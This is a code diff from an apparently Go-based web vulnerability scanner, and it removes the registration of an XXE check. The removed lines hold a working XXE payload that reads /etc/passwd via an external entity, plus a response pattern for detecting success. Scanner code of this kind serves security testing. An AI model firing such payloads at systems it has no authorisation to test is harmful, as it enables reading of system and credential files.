@@ -53,17 +53,6 @@ type xxeCrawlJob struct {
 	Depth int
 }
 
-// init registers the XXE check
-func init() {
-	vulns = append(vulns, VulnCheck{
-		Name:    "XXE",
-		Param:   "xml",
-		Payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
-		Match:   `root:x:0:0`,
-		Method:  "POST",
-	})
-}
-
 // NewXXEScanner creates a new instance of the XXE scanner
 func NewXXEScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration) (*XXEScanner, error) {
 	parsed, err := url.Parse(start)
